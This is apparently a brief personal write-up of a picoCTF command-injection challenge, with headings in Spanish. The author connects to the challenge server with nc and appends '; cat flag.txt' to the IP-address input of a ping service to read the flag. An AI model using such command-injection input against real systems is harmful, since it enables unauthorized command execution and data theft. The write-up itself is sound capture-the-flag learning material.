## Descripción

- Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?
## Solución

- Me conecté a la instancia del servidor ejecutando: nc mysterious-sea.picoctf.net 60580
    
- En el prompt que pide la dirección IP, inyecté el comando para leer el texto directamente usando: ; cat flag.txt
## Notas adicionales 

![[Pasted image 20260614113906.png]]
## Referencias 
